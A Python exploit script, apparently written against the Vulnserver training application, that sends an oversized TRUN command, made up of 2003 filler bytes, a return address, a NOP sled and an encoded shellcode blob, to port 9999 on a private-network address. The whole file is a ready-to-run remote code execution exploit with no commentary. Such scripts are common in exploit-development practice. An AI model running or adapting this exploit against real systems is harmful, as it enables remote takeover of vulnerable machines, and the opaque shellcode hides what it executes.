#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (b"\xd9\xc7\xbe\xbb\x6b\x2c\x5d\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\xcb\x78\xce\xa8\xd7"
b"\x97\x8c\x53\x27\x68\xf1\xda\xc2\x59\x31\xb8\x87\xca\x81"
b"\xca\xc5\xe6\x6a\x9e\xfd\x7d\x1e\x37\xf2\x36\x95\x61\x3d"
b"\xc6\x86\x52\x5c\x44\xd5\x86\xbe\x75\x16\xdb\xbf\xb2\x4b"
b"\x16\xed\x6b\x07\x85\x01\x1f\x5d\x16\xaa\x53\x73\x1e\x4f"
b"\x23\x72\x0f\xde\x3f\x2d\x8f\xe1\xec\x45\x86\xf9\xf1\x60"
b"\x50\x72\xc1\x1f\x63\x52\x1b\xdf\xc8\x9b\x93\x12\x10\xdc"
b"\x14\xcd\x67\x14\x67\x70\x70\xe3\x15\xae\xf5\xf7\xbe\x25"
b"\xad\xd3\x3f\xe9\x28\x90\x4c\x46\x3e\xfe\x50\x59\x93\x75"
b"\x6c\xd2\x12\x59\xe4\xa0\x30\x7d\xac\x73\x58\x24\x08\xd5"
b"\x65\x36\xf3\x8a\xc3\x3d\x1e\xde\x79\x1c\x77\x13\xb0\x9e"
b"\x87\x3b\xc3\xed\xb5\xe4\x7f\x79\xf6\x6d\xa6\x7e\xf9\x47"
b"\x1e\x10\x04\x68\x5f\x39\xc3\x3c\x0f\x51\xe2\x3c\xc4\xa1"
b"\x0b\xe9\x4b\xf1\xa3\x42\x2c\xa1\x03\x33\xc4\xab\x8b\x6c"
b"\xf4\xd4\x41\x05\x9f\x2f\x02\xea\xc8\x32\x53\x82\x0a\x4c"
b"\x42\x0f\x82\xaa\x0e\xbf\xc2\x65\xa7\x26\x4f\xfd\x56\xa6"
b"\x45\x78\x58\x2c\x6a\x7d\x17\xc5\x07\x6d\xc0\x25\x52\xcf"
b"\x47\x39\x48\x67\x0b\xa8\x17\x77\x42\xd1\x8f\x20\x03\x27"
b"\xc6\xa4\xb9\x1e\x70\xda\x43\xc6\xbb\x5e\x98\x3b\x45\x5f"
b"\x6d\x07\x61\x4f\xab\x88\x2d\x3b\x63\xdf\xfb\x95\xc5\x89"
b"\x4d\x4f\x9c\x66\x04\x07\x59\x45\x97\x51\x66\x80\x61\xbd"
b"\xd7\x7d\x34\xc2\xd8\xe9\xb0\xbb\x04\x8a\x3f\x16\x8d\xaa"
b"\xdd\xb2\xf8\x42\x78\x57\x41\x0f\x7b\x82\x86\x36\xf8\x26"
b"\x77\xcd\xe0\x43\x72\x89\xa6\xb8\x0e\x82\x42\xbe\xbd\xa3"
b"\x46")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.137.189',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
